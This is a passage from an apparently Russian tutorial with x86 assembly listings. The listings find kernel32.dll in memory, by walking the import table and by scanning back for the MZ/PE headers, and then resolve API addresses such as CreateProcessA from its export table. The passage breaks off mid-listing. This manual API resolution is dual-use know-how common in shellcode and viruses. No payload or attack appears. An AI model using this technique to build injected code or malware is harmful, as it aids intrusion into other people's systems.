&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #ff0000;">4</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">4</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">'23LE'</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">je</span> kern_imp<br/>
<br/>
next<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">14h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Следующий каталог импорта</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">jmp</span> next_module<br/>
<br/>
kern_imp<span style="color: #339933;">:</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Указатель на таблицу имен импортируемых</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;функций из kernel32</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">xor</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ecx</span><br/>
<br/>
api_imp<span style="color: #339933;">:</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #ff0000;">4</span> ptr <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;нулевой элемень = конец таблицы &nbsp;имен</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">jz</span> &nbsp;no_kern_imp<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: #ff0000;">2</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Первые два байти в каждой записи таблицы</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;имен отведены под хинт-нейм</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edx</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span>offset gmh<br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">16</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">repe</span> <span style="color: #00007f; font-weight: bold;">cmpsb</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;Ищем GetModuleHandleA</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">pop</span> &nbsp;<span style="color: #46aa03; font-weight: bold;">ecx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">jz</span> &nbsp;f_gmh<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">jmp</span> api_imp &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Следующая запись</span><br/>
<br/>
f_gmh<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">10h</span><span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;указатель на таблицу адресов импорта</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ecx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;указатель на адрес соответсвующий требуемой</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;нами функции</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;адрес функии</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp;<span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span>offset Modulename<br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">call</span> <span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;Вызываем GetModuleHandleA</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;RETRUN: EAX - хэндл (адрес) kernel32.dll</span><br/>
<br/>
no_kern_imp<span style="color: #339933;">:</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">nop</span><br/>
end <span style="color: #0000ff; font-weight: bold;">start</span><br/>
&nbsp;</div></li>
<li>Второй способ анализа - найти адрес любой функции импортируемой из кернеля и выровняв ее на сегмент, получить приблизительный адрес кернеля, а затем уже сканируя память найти точный адрес кернеля.
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">.</span>386p<br/>
<span style="color: #339933;">.</span>model <span style="color: #0000ff; font-weight: bold;">flat</span><br/>
extrn GetModuleHandleA<span style="color: #339933;">:</span>proc<br/>
<span style="color: #0000ff; font-weight: bold;">.data</span><br/>
<span style="color: #0000ff; font-weight: bold;">imagebase</span> &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">00400000h</span><br/>
Modulename &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">'KERNEL32.DLL'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
gmh &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">'GetModuleHandleA'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
<span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">code</span><br/>
<span style="color: #0000ff; font-weight: bold;">start</span><span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">int</span> <span style="color: #ff0000;">3h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;Для отладки</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #0000ff; font-weight: bold;">imagebase</span><span style="color: black;">&#93;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp;<span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">3ch</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">add</span> &nbsp;<span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;EAX - адрес PE заголовка</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">+</span><span style="color: #ff0000;">80h</span><span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;EBX - адрес первого каталога импорта (RVA)</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Выровняли на imagebase</span><br/>
<br/>
next_module<span style="color: #339933;">:</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">0ch</span><span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Указатель на имя модуля из которого осуществляется</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;импорт для текущего каталога импорта</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #ff0000;">4</span> ptr <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Последний каталог импорта имеет нулевые значения</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">jz</span> &nbsp;no_kern_imp<br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edx</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #ff0000;">4</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">'NREK'</span> &nbsp;<span style="color: black; font-style: italic;">;Тут по уму еще надо проверить на kernel32</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;(имя модуля может быть в нижнем регистре)</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">jne</span> next<br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #ff0000;">4</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">4</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">'23LE'</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">je</span> kern_imp<br/>
<br/>
next<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">14h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Следующий каталог импорта</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">jmp</span> next_module<br/>
<br/>
kern_imp<span style="color: #339933;">:</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">10h</span><span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Указатель на таблицу адресов импортируемых</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;функций из kernel32</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edx</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">xor</span> <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #339933;">...</span><br/>
&nbsp;</div></li>
</ol>
<p>Как узнать адрес начала PE-файла зная <em>любой</em> виртуальный адрес внутри файла?</p>
<p>Поскольку</p>
<ol>
<li>адрес загрузки PE файла выровнен на 64k,</li>
<li>практически всю память от начала файла и до конца выделенной ему области можно читать</li>
<li>в самом начале файла лежит MZ-заголовок</li>
</ol>
<p>то справедлив следующий алгоритм:</p>
<ol>
<li>взять любой виртуальный адрес внутри файла</li>
<li>выровнять на 64k</li>
<li>если по адресу HЕ байты 'MZ', то вычесть из адреса 64k и повторить 3</li>
</ol>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp;<span style="color: #339933;">...</span><br/>
f_kern32<span style="color: #339933;">:</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #ff0000;">2</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">'ZM'</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">je</span> &nbsp;check_pe<br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #ff0000;">2</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">'MZ'</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">jne</span> next_seg<br/>
<br/>
check_pe<span style="color: #339933;">:</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #ff0000;">1</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">18h</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">40h</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Hа всякий случай</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">jne</span> next_seg<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">3ch</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edx</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #ff0000;">4</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">'EP'</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Hа всякий случай</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">jne</span> next_seg<br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">jmp</span> kern32<br/>
<br/>
next_seg<span style="color: #339933;">:</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">sub</span> <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">10000h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">jmp</span> f_kern32<br/>
<br/>
kern32<span style="color: #339933;">:</span><br/>
no_kern_imp<span style="color: #339933;">:</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">nop</span><br/>
<br/>
end <span style="color: #0000ff; font-weight: bold;">start</span><br/>
&nbsp;</div>
<p>Как анализировать kernel'овские экспорты?</p>
<p>В зависимости от свободного времени, желания, и возможностей, есть такие пути:</p>
<p>Путь 1, наилучший:</p>
<p>Посмотреть формат PE файлов, ту его часть, где описаны экспорты, и, получив адрес kernel'а, самому разобрать его таблицу экспортов и найти адреса требуемых функций.</p>
<p>Путь 2, весьма отстойный:</p>
<p>Юзать директом следующий код:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">; input: &nbsp;EDI=имя функции kernel'а (например 'CreateProcessA')</span><br/>
<span style="color: black; font-style: italic;">; output: ZF=1, EAX=0 (function not found)</span><br/>
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; ZF=0, EAX=function va</span><br/>
<br/>
get_proc_address<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pusha</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0BFF70000h</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; get_kernel_base</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">3Ch</span><span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; mz_neptr</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">+</span><span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">78h</span><span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; pe_exporttablerva</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jecxz</span> &nbsp; __return_0<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ebx</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">esi</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; current index</span><br/>
__search_cycle<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">*</span><span style="color: #ff0000;">4</span><span style="color: #339933;">+</span><span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">20h</span><span style="color: black;">&#93;</span> &nbsp;<span style="color: black; font-style: italic;">; ex_namepointersrva</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; name va</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ebx</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; +imagebase</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">edi</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; compare names</span><br/>
__cmp_cycle<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jne</span> &nbsp; &nbsp; __cmp_done<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span> &nbsp; &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">al</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span> &nbsp; &nbsp; &nbsp;__cmp_done<br/>
